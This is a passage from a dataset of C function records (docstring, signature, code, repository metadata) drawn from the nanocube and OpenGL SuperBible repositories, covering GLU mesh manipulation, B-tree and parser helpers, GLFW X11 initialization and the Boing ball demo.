{\n\t/* Make sure that eSym->Org points to a valid half-edge */\n\teSym->Org->anEdge = eSym->Onext;\n\tSplice( eSym, eSym->Oprev );\n      }\n      KillEdge( e );\n    }\n  } while( e != eStart );\n\n  /* delete from circular doubly-linked list */\n  fPrev = fZap->prev;\n  fNext = fZap->next;\n  fNext->prev = fPrev;\n  fPrev->next = fNext;\n\n  memFree( fZap );\n}", "path": "nanocube/src/polycover/glu/mesh.c", "commit_date": "2017-11-09 00:00:00", "repo_name": "laurolins/nanocube", "stars": 729, "license": "epl-1.0", "language": "c", "size": 44915}
{"docstring": "//------------------------------------------------------------------------------\n// bt_Record\n//------------------------------------------------------------------------------\n", "func_signal": "internal void\nbt_Record_init(bt_Record *self, char *key_begin, char *key_end, char *value_begin, char *value_end)", "code": "{\n\tself->hash = bt_murmur_hash2_64A(key_begin, (s32) (key_end-key_begin), bt_MURMUR_SEED);\n\tself->key.begin = key_begin;\n\tself->key.end   = key_end;\n\tself->value.begin = value_begin;\n\tself->value.end   = value_end;\n\tself->sizes.header           = (u32) sizeof(bt_KeyValue);\n\tself->sizes.header_aligned   = (u32) pt_next_multiple(self->sizes.header,8);\n\tself->sizes.key              = pt_safe_s64_u32(key_end - key_begin);\n\tself->sizes.key_aligned      = (u32)pt_next_multiple(self->sizes.key,8);\n\tself->sizes.value            = pt_safe_s64_u32(value_end - value_begin);\n\tself->sizes.value_aligned    = (u32)pt_next_multiple(self->sizes.value,8);\n\tself->sizes.total_aligned    = self->sizes.header_aligned +\n\t\tself->sizes.key_aligned + self->sizes.value_aligned;\n}", "path": "nanocube/src/nanocube/nanocube_btree.c", "commit_date": "2018-07-24 00:00:00", "repo_name": "laurolins/nanocube", "stars": 729, "license": "epl-1.0", "language": "c", "size": 44915}
{"docstring": "/*\n * rp_Element\n */\n", "func_signal": "internal void\nrp_Element_init(rp_Element *self, char *tag_begin, char *tag_end)", "code": "{\n\tself->tag.begin = tag_begin;\n\tself->tag.end   = tag_end;\n\tself->kv_first  = 0;\n\tself->kv_last   = 0;\n\n\t/* not initialized */\n\tself->memory_checkpoint.checkpoint = 0;\n}", "path": "nanocube/src/roadmap/roadmap_parser.c", "commit_date": "2017-11-09 00:00:00", "repo_name": "laurolins/nanocube", "stars": 729, "license": "epl-1.0", "language": "c", "size": 44915}
{"docstring": "/* KillVertex( vDel ) destroys a vertex and removes it from the global\n * vertex list.  It updates the vertex loop to point to a given new vertex.\n */\n", "func_signal": "static void KillVertex( GLUvertex *vDel, GLUvertex *newOrg )", "code": "{\n  GLUhalfEdge *e, *eStart = vDel->anEdge;\n  GLUvertex *vPrev, *vNext;\n\n  /* change the origin of all affected edges */\n  e = eStart;\n  do {\n    e->Org = newOrg;\n    e = e->Onext;\n  } while( e != eStart );\n\n  /* delete from circular doubly-linked list */\n  vPrev = vDel->prev;\n  vNext = vDel->next;\n  vNext->prev = vPrev;\n  vPrev->next = vNext;\n\n  memFree( vDel );\n}", "path": "nanocube/src/polycover/glu/mesh.c", "commit_date": "2017-11-09 00:00:00", "repo_name": "laurolins/nanocube", "stars": 729, "license": "epl-1.0", "language": "c", "size": 44915}
{"docstring": "/* __gl_meshUnion( mesh1, mesh2 ) forms the union of all structures in\n * both meshes, and returns the new mesh (the old meshes are destroyed).\n */\n", "func_signal": "GLUmesh *__gl_meshUnion( GLUmesh *mesh1, GLUmesh *mesh2 )", "code": "{\n  GLUface *f1 = &mesh1->fHead;\n  GLUvertex *v1 = &mesh1->vHead;\n  GLUhalfEdge *e1 = &mesh1->eHead;\n  GLUface *f2 = &mesh2->fHead;\n  GLUvertex *v2 = &mesh2->vHead;\n  GLUhalfEdge *e2 = &mesh2->eHead;\n\n  /* Add the faces, vertices, and edges of mesh2 to those of mesh1 */\n  if( f2->next != f2 ) {\n    f1->prev->next = f2->next;\n    f2->next->prev = f1->prev;\n    f2->prev->next = f1;\n    f1->prev = f2->prev;\n  }\n\n  if( v2->next != v2 ) {\n    v1->prev->next = v2->next;\n    v2->next->prev = v1->prev;\n    v2->prev->next = v1;\n    v1->prev = v2->prev;\n  }\n\n  if( e2->next != e2 ) {\n    e1->Sym->next->Sym->next = e2->next;\n    e2->next->Sym->next = e1->Sym->next;\n    e2->Sym->next->Sym->next = e1;\n    e1->Sym->next = e2->Sym->next;\n  }\n\n  memFree( mesh2 );\n  return mesh1;\n}", "path": "nanocube/src/polycover/glu/mesh.c", "commit_date": "2017-11-09 00:00:00", "repo_name": "laurolins/nanocube", "stars": 729, "license": "epl-1.0", "language": "c", "size": 44915}
{"docstring": "/*\n * rp_Parser\n */\n", "func_signal": "internal void\nrp_Parser_fill_buffer(rp_Parser *self)", "code": "{\n\tif (self->eof || self->error) return;\n\tif (self->tkbegin != self->buffer) {\n\t\tnt_Token *dst = self->buffer;\n\t\tnt_Token *src = self->tkbegin;\n\t\twhile (src != self->tkend) {\n\t\t\t*dst++ = *src++;\n\t\t}\n\t\tself->tkbegin = self->buffer;\n\t\tself->tkend = dst;\n\t}\n\tnt_Token *end = self->buffer + rp_Parser_LOOKAHEAD;\n\twhile (self->tkend != end) {\n\t\tif (nt_Tokenizer_next(&self->tokenizer)) {\n\t\t\t*self->tkend++ = self->tokenizer.token;\n\t\t} else {\n\t\t\tif (self->tokenizer.next_result_detail == nt_TOKENIZER_NEXT_RESULT_INVALID_INPUT) {\n\t\t\t\tself->error = 1;\n\t\t\t\tbreak;\n\t\t\t} else {\n\t\t\t\tself->eof = 1;\n\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\t}\n}", "path": "nanocube/src/roadmap/roadmap_parser.c", "commit_date": "2017-11-09 00:00:00", "repo_name": "laurolins/nanocube", "stars": 729, "license": "epl-1.0", "language": "c", "size": 44915}
{"docstring": "/* __gl_meshNewMesh() creates a new mesh with no edges, no vertices,\n * and no loops (what we usually call a \"face\").\n */\n", "func_signal": "GLUmesh *__gl_meshNewMesh( void )", "code": "{\n  GLUvertex *v;\n  GLUface *f;\n  GLUhalfEdge *e;\n  GLUhalfEdge *eSym;\n  GLUmesh *mesh = (GLUmesh *)memAlloc( sizeof( GLUmesh ));\n  if (mesh == NULL) {\n     return NULL;\n  }\n  \n  v = &mesh->vHead;\n  f = &mesh->fHead;\n  e = &mesh->eHead;\n  eSym = &mesh->eHeadSym;\n\n  v->next = v->prev = v;\n  v->anEdge = NULL;\n  v->data = NULL;\n\n  f->next = f->prev = f;\n  f->anEdge = NULL;\n  f->data = NULL;\n  f->trail = NULL;\n  f->marked = FALSE;\n  f->inside = FALSE;\n\n  e->next = e;\n  e->Sym = eSym;\n  e->Onext = NULL;\n  e->Lnext = NULL;\n  e->Org = NULL;\n  e->Lface = NULL;\n  e->winding = 0;\n  e->activeRegion = NULL;\n\n  eSym->next = eSym;\n  eSym->Sym = e;\n  eSym->Onext = NULL;\n  eSym->Lnext = NULL;\n  eSym->Org = NULL;\n  eSym->Lface = NULL;\n  eSym->winding = 0;\n  eSym->activeRegion = NULL;\n\n  return mesh;\n}", "path": "nanocube/src/polycover/glu/mesh.c", "commit_date": "2017-11-09 00:00:00", "repo_name": "laurolins/nanocube", "stars": 729, "license": "epl-1.0", "language": "c", "size": 44915}
{"docstring": "/* __gl_meshDeleteMesh( mesh ) will free all storage for any valid mesh.\n */\n", "func_signal": "void __gl_meshDeleteMesh( GLUmesh *mesh )", "code": "{\n  GLUface *f, *fNext;\n  GLUvertex *v, *vNext;\n  GLUhalfEdge *e, *eNext;\n\n  for( f = mesh->fHead.next; f != &mesh->fHead; f = fNext ) {\n    fNext = f->next;\n    memFree( f );\n  }\n\n  for( v = mesh->vHead.next; v != &mesh->vHead; v = vNext ) {\n    vNext = v->next;\n    memFree( v );\n  }\n\n  for( e = mesh->eHead.next; e != &mesh->eHead; e = eNext ) {\n    /* One call frees both e and e->Sym (see EdgePair above) */\n    eNext = e->next;\n    memFree( e );\n  }\n\n  memFree( mesh );\n}", "path": "nanocube/src/polycover/glu/mesh.c", "commit_date": "2017-11-09 00:00:00", "repo_name": "laurolins/nanocube", "stars": 729, "license": "epl-1.0", "language": "c", "size": 44915}
{"docstring": "/* KillEdge( eDel ) destroys an edge (the half-edges eDel and eDel->Sym),\n * and removes from the global edge list.\n */\n", "func_signal": "static void KillEdge( GLUhalfEdge *eDel )", "code": "{\n  GLUhalfEdge *ePrev, *eNext;\n\n  /* Half-edges are allocated in pairs, see EdgePair above */\n  if( eDel->Sym < eDel ) { eDel = eDel->Sym; }\n\n  /* delete from circular doubly-linked list */\n  eNext = eDel->next;\n  ePrev = eDel->Sym->next;\n  eNext->Sym->next = ePrev;\n  ePrev->Sym->next = eNext;\n\n  memFree( eDel );\n}", "path": "nanocube/src/polycover/glu/mesh.c", "commit_date": "2017-11-09 00:00:00", "repo_name": "laurolins/nanocube", "stars": 729, "license": "epl-1.0", "language": "c", "size": 44915}
{"docstring": "//------------------------------------------------------------------------------\n// bt_Node\n//------------------------------------------------------------------------------\n", "func_signal": "internal void\nbt_Node_init(bt_Node *self)", "code": "{\n\t// make sure everything is zeroed\n\tpt_fill((char*) self, (char*) self + sizeof(bt_Node), 0);\n\tself->num_entries = 0;\n\tself->is_leaf     = 1;\n}", "path": "nanocube/src/nanocube/nanocube_btree.c", "commit_date": "2018-07-24 00:00:00", "repo_name": "laurolins/nanocube", "stars": 729, "license": "epl-1.0", "language": "c", "size": 44915}
{"docstring": "//////////////////////////////////////////////////////////////////////////\n//////                        GLFW public API                       //////\n//////////////////////////////////////////////////////////////////////////\n", "func_signal": "GLFWAPI int glfwJoystickPresent(int joy)", "code": "{\n    _GLFW_REQUIRE_INIT_OR_RETURN(0);\n\n    if (joy < 0 || joy > GLFW_JOYSTICK_LAST)\n    {\n        _glfwInputError(GLFW_INVALID_ENUM, NULL);\n        return 0;\n    }\n\n    return _glfwPlatformJoystickPresent(joy);\n}", "path": "sb7code/extern/glfw-3.0.4/src/joystick.c", "commit_date": "2015-07-24 00:00:00", "repo_name": "openglsuperbible/sb7code", "stars": 704, "license": "None", "language": "c", "size": 816}
{"docstring": "/*****************************************************************************\n * Draw the Boing ball.\n *\n * The Boing ball is sphere in which each facet is a rectangle.\n * Facet colors alternate between red and white.\n * The ball is built by stacking latitudinal circles.  Each circle is composed\n * of a widely-separated set of points, so that each facet is noticably large.\n *****************************************************************************/\n", "func_signal": "void DrawBoingBall( void )", "code": "{\n   GLfloat lon_deg;     /* degree of longitude */\n   double dt_total, dt2;\n\n   glPushMatrix();\n   glMatrixMode( GL_MODELVIEW );\n\n  /*\n   * Another relative Z translation to separate objects.\n   */\n   glTranslatef( 0.0, 0.0, DIST_BALL );\n\n   /* Update ball position and rotation (iterate if necessary) */\n   dt_total = dt;\n   while( dt_total > 0.0 )\n   {\n       dt2 = dt_total > MAX_DELTA_T ? MAX_DELTA_T : dt_total;\n       dt_total -= dt2;\n       BounceBall( dt2 );\n       deg_rot_y = TruncateDeg( deg_rot_y + deg_rot_y_inc*((float)dt2*ANIMATION_SPEED) );\n   }\n\n   /* Set ball position */\n   glTranslatef( ball_x, ball_y, 0.0 );\n\n  /*\n   * Offset the shadow.\n   */\n   if ( drawBallHow == DRAW_BALL_SHADOW )\n   {\n      glTranslatef( SHADOW_OFFSET_X,\n                    SHADOW_OFFSET_Y,\n                    SHADOW_OFFSET_Z );\n   }\n\n  /*\n   * Tilt the ball.\n   */\n   glRotatef( -20.0, 0.0, 0.0, 1.0 );\n\n  /*\n   * Continually rotate ball around Y axis.\n   */\n   glRotatef( deg_rot_y, 0.0, 1.0, 0.0 );\n\n  /*\n   * Set OpenGL state for Boing ball.\n   */\n   glCullFace( GL_FRONT );\n   glEnable( GL_CULL_FACE );\n   glEnable( GL_NORMALIZE );\n\n  /*\n   * Build a faceted latitude slice of the Boing ball,\n   * stepping same-sized vertical bands of the sphere.\n   */\n   for ( lon_deg = 0;\n         lon_deg < 180;\n         lon_deg += STEP_LONGITUDE )\n   {\n     /*\n      * Draw a latitude circle at this longitude.\n      */\n      DrawBoingBallBand( lon_deg,\n                         lon_deg + STEP_LONGITUDE );\n   }\n\n   glPopMatrix();\n\n   return;\n}", "path": "sb7code/extern/glfw-3.0.4/examples/boing.c", "commit_date": "2015-07-24 00:00:00", "repo_name": "openglsuperbible/sb7code", "stars": 704, "license": "None", "language": "c", "size": 816}
{"docstring": "/*****************************************************************************\n * reshape()\n *****************************************************************************/\n", "func_signal": "void reshape( GLFWwindow* window, int w, int h )", "code": "{\n   glViewport( 0, 0, (GLsizei)w, (GLsizei)h );\n\n   glMatrixMode( GL_PROJECTION );\n   glLoadIdentity();\n\n   gluPerspective( PerspectiveAngle( RADIUS * 2, 200 ),\n                   (GLfloat)w / (GLfloat)h,\n                   1.0,\n                   VIEW_SCENE_DIST );\n\n   glMatrixMode( GL_MODELVIEW );\n   glLoadIdentity();\n\n   gluLookAt( 0.0, 0.0, VIEW_SCENE_DIST,/* eye */\n              0.0, 0.0, 0.0,            /* center of vision */\n              0.0, -1.0, 0.0 );         /* up vector */\n}", "path": "sb7code/extern/glfw-3.0.4/examples/boing.c", "commit_date": "2015-07-24 00:00:00", "repo_name": "openglsuperbible/sb7code", "stars": 704, "license": "None", "language": "c", "size": 816}
{"docstring": "// Update the key code LUT\n//\n", "func_signal": "static void updateKeyCodeLUT(void)", "code": "{\n    int i, keyCode, keyCodeGLFW;\n    char name[XkbKeyNameLength + 1];\n    XkbDescPtr descr;\n\n    // Clear the LUT\n    for (keyCode = 0;  keyCode < 256;  keyCode++)\n        _glfw.x11.keyCodeLUT[keyCode] = GLFW_KEY_UNKNOWN;\n\n    // Use XKB to determine physical key locations independently of the current\n    // keyboard layout\n\n    // Get keyboard description\n    descr = XkbGetKeyboard(_glfw.x11.display,\n                            XkbAllComponentsMask,\n                            XkbUseCoreKbd);\n\n    // Find the X11 key code -> GLFW key code mapping\n    for (keyCode = descr->min_key_code; keyCode <= descr->max_key_code; ++keyCode)\n    {\n        // Get the key name\n        for (i = 0;  i < XkbKeyNameLength;  i++)\n            name[i] = descr->names->keys[keyCode].name[i];\n\n        name[XkbKeyNameLength] = 0;\n\n        // Map the key name to a GLFW key code. Note: We only map printable\n        // keys here, and we use the US keyboard layout. The rest of the\n        // keys (function keys) are mapped using traditional KeySym\n        // translations.\n        if (strcmp(name, \"TLDE\") == 0) keyCodeGLFW = GLFW_KEY_GRAVE_ACCENT;\n        else if (strcmp(name, \"AE01\") == 0) keyCodeGLFW = GLFW_KEY_1;\n        else if (strcmp(name, \"AE02\") == 0) keyCodeGLFW = GLFW_KEY_2;\n        else if (strcmp(name, \"AE03\") == 0) keyCodeGLFW = GLFW_KEY_3;\n        else if (strcmp(name, \"AE04\") == 0) keyCodeGLFW = GLFW_KEY_4;\n        else if (strcmp(name, \"AE05\") == 0) keyCodeGLFW = GLFW_KEY_5;\n        else if (strcmp(name, \"AE06\") == 0) keyCodeGLFW = GLFW_KEY_6;\n        else if (strcmp(name, \"AE07\") == 0) keyCodeGLFW = GLFW_KEY_7;\n        else if (strcmp(name, \"AE08\") == 0) keyCodeGLFW = GLFW_KEY_8;\n        else if (strcmp(name, \"AE09\") == 0) keyCodeGLFW = GLFW_KEY_9;\n        else if (strcmp(name, \"AE10\") == 0) keyCodeGLFW = GLFW_KEY_0;\n        else if (strcmp(name, \"AE11\") == 0) keyCodeGLFW = GLFW_KEY_MINUS;\n        else if (strcmp(name, \"AE12\") == 0) keyCodeGLFW = GLFW_KEY_EQUAL;\n        else if (strcmp(name, \"AD01\") == 0) keyCodeGLFW = GLFW_KEY_Q;\n        else if (strcmp(name, \"AD02\") == 0) keyCodeGLFW = GLFW_KEY_W;\n        else if (strcmp(name, \"AD03\") == 0) keyCodeGLFW = GLFW_KEY_E;\n        else if (strcmp(name, \"AD04\") == 0) keyCodeGLFW = GLFW_KEY_R;\n        else if (strcmp(name, \"AD05\") == 0) keyCodeGLFW = GLFW_KEY_T;\n        else if (strcmp(name, \"AD06\") == 0) keyCodeGLFW = GLFW_KEY_Y;\n        else if (strcmp(name, \"AD07\") == 0) keyCodeGLFW = GLFW_KEY_U;\n        else if (strcmp(name, \"AD08\") == 0) keyCodeGLFW = GLFW_KEY_I;\n        else if (strcmp(name, \"AD09\") == 0) keyCodeGLFW = GLFW_KEY_O;\n        else if (strcmp(name, \"AD10\") == 0) keyCodeGLFW = GLFW_KEY_P;\n        else if (strcmp(name, \"AD11\") == 0) keyCodeGLFW = GLFW_KEY_LEFT_BRACKET;\n        else if (strcmp(name, \"AD12\") == 0) keyCodeGLFW = GLFW_KEY_RIGHT_BRACKET;\n        else if (strcmp(name, \"AC01\") == 0) keyCodeGLFW = GLFW_KEY_A;\n        else if (strcmp(name, \"AC02\") == 0) keyCodeGLFW = GLFW_KEY_S;\n        else if (strcmp(name, \"AC03\") == 0) keyCodeGLFW = GLFW_KEY_D;\n        else if (strcmp(name, \"AC04\") == 0) keyCodeGLFW = GLFW_KEY_F;\n        else if (strcmp(name, \"AC05\") == 0) keyCodeGLFW = GLFW_KEY_G;\n        else if (strcmp(name, \"AC06\") == 0) keyCodeGLFW = GLFW_KEY_H;\n        else if (strcmp(name, \"AC07\") == 0) keyCodeGLFW = GLFW_KEY_J;\n        else if (strcmp(name, \"AC08\") == 0) keyCodeGLFW = GLFW_KEY_K;\n        else if (strcmp(name, \"AC09\") == 0) keyCodeGLFW = GLFW_KEY_L;\n        else if (strcmp(name, \"AC10\") == 0) keyCodeGLFW = GLFW_KEY_SEMICOLON;\n        else if (strcmp(name, \"AC11\") == 0) keyCodeGLFW = GLFW_KEY_APOSTROPHE;\n        else if (strcmp(name, \"AB01\") == 0) keyCodeGLFW = GLFW_KEY_Z;\n        else if (strcmp(name, \"AB02\") == 0) keyCodeGLFW = GLFW_KEY_X;\n        else if (strcmp(name, \"AB03\") == 0) keyCodeGLFW = GLFW_KEY_C;\n        else if (strcmp(name, \"AB04\") == 0) keyCodeGLFW = GLFW_KEY_V;\n        else if (strcmp(name, \"AB05\") == 0) keyCodeGLFW = GLFW_KEY_B;\n        else if (strcmp(name, \"AB06\") == 0) keyCodeGLFW = GLFW_KEY_N;\n        else if (strcmp(name, \"AB07\") == 0) keyCodeGLFW = GLFW_KEY_M;\n        else if (strcmp(name, \"AB08\") == 0) keyCodeGLFW = GLFW_KEY_COMMA;\n        else if (strcmp(name, \"AB09\") == 0) keyCodeGLFW = GLFW_KEY_PERIOD;\n        else if (strcmp(name, \"AB10\") == 0) keyCodeGLFW = GLFW_KEY_SLASH;\n        else if (strcmp(name, \"BKSL\") == 0) keyCodeGLFW = GLFW_KEY_BACKSLASH;\n        else if (strcmp(name, \"LSGT\") == 0) keyCodeGLFW = GLFW_KEY_WORLD_1;\n        else keyCodeGLFW = GLFW_KEY_UNKNOWN;\n\n        // Update the key code LUT\n        if ((keyCode >= 0) && (keyCode < 256))\n            _glfw.x11.keyCodeLUT[keyCode] = keyCodeGLFW;\n    }\n\n    // Free the keyboard description\n    XkbFreeKeyboard(descr, 0, True);\n\n    // Translate the un-translated key codes using traditional X11 KeySym\n    // lookups\n    for (keyCode = 0;  keyCode < 256;  keyCode++)\n    {\n        if (_glfw.x11.keyCodeLUT[keyCode] < 0)\n            _glfw.x11.keyCodeLUT[keyCode] = translateKey(keyCode);\n    }\n}", "path": "sb7code/extern/glfw-3.0.4/src/x11_init.c", "commit_date": "2015-07-24 00:00:00", "repo_name": "openglsuperbible/sb7code", "stars": 704, "license": "None", "language": "c", "size": 816}
{"docstring": "/*****************************************************************************\n * Bounce the ball.\n *****************************************************************************/\n", "func_signal": "void BounceBall( double delta_t )", "code": "{\n   GLfloat sign;\n   GLfloat deg;\n\n   /* Bounce on walls */\n   if ( ball_x >  (BOUNCE_WIDTH/2 + WALL_R_OFFSET ) )\n   {\n      ball_x_inc = -0.5f - 0.75f * (GLfloat)rand() / (GLfloat)RAND_MAX;\n      deg_rot_y_inc = -deg_rot_y_inc;\n   }\n   if ( ball_x < -(BOUNCE_HEIGHT/2 + WALL_L_OFFSET) )\n   {\n      ball_x_inc =  0.5f + 0.75f * (GLfloat)rand() / (GLfloat)RAND_MAX;\n      deg_rot_y_inc = -deg_rot_y_inc;\n   }\n\n   /* Bounce on floor / roof */\n   if ( ball_y >  BOUNCE_HEIGHT/2      )\n   {\n      ball_y_inc = -0.75f - 1.f * (GLfloat)rand() / (GLfloat)RAND_MAX;\n   }\n   if ( ball_y < -BOUNCE_HEIGHT/2*0.85 )\n   {\n      ball_y_inc =  0.75f + 1.f * (GLfloat)rand() / (GLfloat)RAND_MAX;\n   }\n\n   /* Update ball position */\n   ball_x += ball_x_inc * ((float)delta_t*ANIMATION_SPEED);\n   ball_y += ball_y_inc * ((float)delta_t*ANIMATION_SPEED);\n\n  /*\n   * Simulate the effects of gravity on Y movement.\n   */\n   if ( ball_y_inc < 0 ) sign = -1.0; else sign = 1.0;\n\n   deg = (ball_y + BOUNCE_HEIGHT/2) * 90 / BOUNCE_HEIGHT;\n   if ( deg > 80 ) deg = 80;\n   if ( deg < 10 ) deg = 10;\n\n   ball_y_inc = sign * 4.f * (float) sin_deg( deg );\n}", "path": "sb7code/extern/glfw-3.0.4/examples/boing.c", "commit_date": "2015-07-24 00:00:00", "repo_name": "openglsuperbible/sb7code", "stars": 704, "license": "None", "language": "c", "size": 816}
{"docstring": "//////////////////////////////////////////////////////////////////////////\n//////                       GLFW platform API                      //////\n//////////////////////////////////////////////////////////////////////////\n", "func_signal": "int _glfwPlatformInit(void)", "code": "{\n    XInitThreads();\n\n    _glfw.x11.display = XOpenDisplay(NULL);\n    if (!_glfw.x11.display)\n    {\n        _glfwInputError(GLFW_API_UNAVAILABLE, \"X11: Failed to open X display\");\n        return GL_FALSE;\n    }\n\n    _glfw.x11.screen = DefaultScreen(_glfw.x11.display);\n    _glfw.x11.root = RootWindow(_glfw.x11.display, _glfw.x11.screen);\n    _glfw.x11.context = XUniqueContext();\n\n    if (!initExtensions())\n        return GL_FALSE;\n\n    _glfw.x11.cursor = createNULLCursor();\n\n    if (!_glfwInitContextAPI())\n        return GL_FALSE;\n\n    _glfwInitTimer();\n    _glfwInitJoysticks();\n    _glfwInitGammaRamp();\n\n    return GL_TRUE;\n}", "path": "sb7code/extern/glfw-3.0.4/src/x11_init.c", "commit_date": "2015-07-24 00:00:00", "repo_name": "openglsuperbible/sb7code", "stars": 704, "license": "None", "language": "c", "size": 816}
{"docstring": "// Initialize X11 display and look for supported X11 extensions\n//\n", "func_signal": "static GLboolean initExtensions(void)", "code": "{\n    Bool supported;\n\n    // Find or create window manager atoms\n    _glfw.x11.WM_STATE = XInternAtom(_glfw.x11.display, \"WM_STATE\", False);\n    _glfw.x11.WM_DELETE_WINDOW = XInternAtom(_glfw.x11.display,\n                                             \"WM_DELETE_WINDOW\",\n                                             False);\n    _glfw.x11.MOTIF_WM_HINTS = XInternAtom(_glfw.x11.display,\n                                           \"_MOTIF_WM_HINTS\",\n                                           False);\n\n    // Check for XF86VidMode extension\n    _glfw.x11.vidmode.available =\n        XF86VidModeQueryExtension(_glfw.x11.display,\n                                  &_glfw.x11.vidmode.eventBase,\n                                  &_glfw.x11.vidmode.errorBase);\n\n    // Check for RandR extension\n    _glfw.x11.randr.available =\n        XRRQueryExtension(_glfw.x11.display,\n                          &_glfw.x11.randr.eventBase,\n                          &_glfw.x11.randr.errorBase);\n\n    if (_glfw.x11.randr.available)\n    {\n        if (!XRRQueryVersion(_glfw.x11.display,\n                             &_glfw.x11.randr.versionMajor,\n                             &_glfw.x11.randr.versionMinor))\n        {\n            _glfwInputError(GLFW_PLATFORM_ERROR,\n                            \"X11: Failed to query RandR version\");\n            return GL_FALSE;\n        }\n\n        // The GLFW RandR path requires at least version 1.3\n        if (_glfw.x11.randr.versionMajor == 1 &&\n            _glfw.x11.randr.versionMinor < 3)\n        {\n            _glfw.x11.randr.available = GL_FALSE;\n        }\n    }\n\n    if (XQueryExtension(_glfw.x11.display,\n                        \"XInputExtension\",\n                        &_glfw.x11.xi.majorOpcode,\n                        &_glfw.x11.xi.eventBase,\n                        &_glfw.x11.xi.errorBase))\n    {\n        _glfw.x11.xi.versionMajor = 2;\n        _glfw.x11.xi.versionMinor = 0;\n\n        if (XIQueryVersion(_glfw.x11.display,\n                           &_glfw.x11.xi.versionMajor,\n                           &_glfw.x11.xi.versionMinor) != BadRequest)\n        {\n            _glfw.x11.xi.available = GL_TRUE;\n        }\n    }\n\n    // Check if Xkb is supported on this display\n    _glfw.x11.xkb.versionMajor = 1;\n    _glfw.x11.xkb.versionMinor = 0;\n    if (!XkbQueryExtension(_glfw.x11.display,\n                           &_glfw.x11.xkb.majorOpcode,\n                           &_glfw.x11.xkb.eventBase,\n                           &_glfw.x11.xkb.errorBase,\n                           &_glfw.x11.xkb.versionMajor,\n                           &_glfw.x11.xkb.versionMinor))\n    {\n        _glfwInputError(GLFW_PLATFORM_ERROR,\n                        \"X11: The keyboard extension is not available\");\n        return GL_FALSE;\n    }\n\n    if (!XkbSetDetectableAutoRepeat(_glfw.x11.display, True, &supported))\n    {\n        _glfwInputError(GLFW_PLATFORM_ERROR,\n                        \"X11: Failed to set detectable key repeat\");\n        return GL_FALSE;\n    }\n\n    if (!supported)\n    {\n        _glfwInputError(GLFW_PLATFORM_ERROR,\n                        \"X11: Detectable key repeat is not supported\");\n        return GL_FALSE;\n    }\n\n    // Update the key code LUT\n    // FIXME: We should listen to XkbMapNotify events to track changes to\n    // the keyboard mapping.\n    updateKeyCodeLUT();\n\n    // Detect whether an EWMH-conformant window manager is running\n    detectEWMH();\n\n    // Find or create string format atoms\n    _glfw.x11.UTF8_STRING =\n        XInternAtom(_glfw.x11.display, \"UTF8_STRING\", False);\n    _glfw.x11.COMPOUND_STRING =\n        XInternAtom(_glfw.x11.display, \"COMPOUND_STRING\", False);\n    _glfw.x11.ATOM_PAIR = XInternAtom(_glfw.x11.display, \"ATOM_PAIR\", False);\n\n    // Find or create selection property atom\n    _glfw.x11.GLFW_SELECTION =\n        XInternAtom(_glfw.x11.display, \"GLFW_SELECTION\", False);\n\n    // Find or create standard clipboard atoms\n    _glfw.x11.TARGETS = XInternAtom(_glfw.x11.display, \"TARGETS\", False);\n    _glfw.x11.MULTIPLE = XInternAtom(_glfw.x11.display, \"MULTIPLE\", False);\n    _glfw.x11.CLIPBOARD = XInternAtom(_glfw.x11.display, \"CLIPBOARD\", False);\n\n    // Find or create clipboard manager atoms\n    _glfw.x11.CLIPBOARD_MANAGER =\n        XInternAtom(_glfw.x11.display, \"CLIPBOARD_MANAGER\", False);\n    _glfw.x11.SAVE_TARGETS =\n        XInternAtom(_glfw.x11.display, \"SAVE_TARGETS\", False);\n\n    return GL_TRUE;\n}", "path": "sb7code/extern/glfw-3.0.4/src/x11_init.c", "commit_date": "2015-07-24 00:00:00", "repo_name": "openglsuperbible/sb7code", "stars": 704, "license": "None", "language": "c", "size": 816}
{"docstring": "// Check whether the running window manager is EWMH-compliant\n//\n", "func_signal": "static void detectEWMH(void)", "code": "{\n    Window* windowFromRoot = NULL;\n    Window* windowFromChild = NULL;\n\n    // First we need a couple of atoms, which should already be there\n    Atom supportingWmCheck =\n        XInternAtom(_glfw.x11.display, \"_NET_SUPPORTING_WM_CHECK\", True);\n    Atom wmSupported =\n        XInternAtom(_glfw.x11.display, \"_NET_SUPPORTED\", True);\n    if (supportingWmCheck == None || wmSupported == None)\n        return;\n\n    // Then we look for the _NET_SUPPORTING_WM_CHECK property of the root window\n    if (_glfwGetWindowProperty(_glfw.x11.root,\n                               supportingWmCheck,\n                               XA_WINDOW,\n                               (unsigned char**) &windowFromRoot) != 1)\n    {\n        XFree(windowFromRoot);\n        return;\n    }\n\n    // It should be the ID of a child window (of the root)\n    // Then we look for the same property on the child window\n    if (_glfwGetWindowProperty(*windowFromRoot,\n                               supportingWmCheck,\n                               XA_WINDOW,\n                               (unsigned char**) &windowFromChild) != 1)\n    {\n        XFree(windowFromRoot);\n        XFree(windowFromChild);\n        return;\n    }\n\n    // It should be the ID of that same child window\n    if (*windowFromRoot != *windowFromChild)\n    {\n        XFree(windowFromRoot);\n        XFree(windowFromChild);\n        return;\n    }\n\n    XFree(windowFromRoot);\n    XFree(windowFromChild);\n\n    // We are now fairly sure that an EWMH-compliant window manager is running\n\n    Atom* supportedAtoms;\n    unsigned long atomCount;\n\n    // Now we need to check the _NET_SUPPORTED property of the root window\n    // It should be a list of supported WM protocol and state atoms\n    atomCount = _glfwGetWindowProperty(_glfw.x11.root,\n                                       wmSupported,\n                                       XA_ATOM,\n                                       (unsigned char**) &supportedAtoms);\n\n    // See which of the atoms we support that are supported by the WM\n\n    _glfw.x11.NET_WM_STATE =\n        getSupportedAtom(supportedAtoms, atomCount, \"_NET_WM_STATE\");\n    _glfw.x11.NET_WM_STATE_FULLSCREEN =\n        getSupportedAtom(supportedAtoms, atomCount, \"_NET_WM_STATE_FULLSCREEN\");\n    _glfw.x11.NET_WM_NAME =\n        getSupportedAtom(supportedAtoms, atomCount, \"_NET_WM_NAME\");\n    _glfw.x11.NET_WM_ICON_NAME =\n        getSupportedAtom(supportedAtoms, atomCount, \"_NET_WM_ICON_NAME\");\n    _glfw.x11.NET_WM_PID =\n        getSupportedAtom(supportedAtoms, atomCount, \"_NET_WM_PID\");\n    _glfw.x11.NET_WM_PING =\n        getSupportedAtom(supportedAtoms, atomCount, \"_NET_WM_PING\");\n    _glfw.x11.NET_ACTIVE_WINDOW =\n        getSupportedAtom(supportedAtoms, atomCount, \"_NET_ACTIVE_WINDOW\");\n    _glfw.x11.NET_WM_BYPASS_COMPOSITOR =\n        getSupportedAtom(supportedAtoms, atomCount, \"_NET_WM_BYPASS_COMPOSITOR\");\n\n    XFree(supportedAtoms);\n\n    _glfw.x11.hasEWMH = 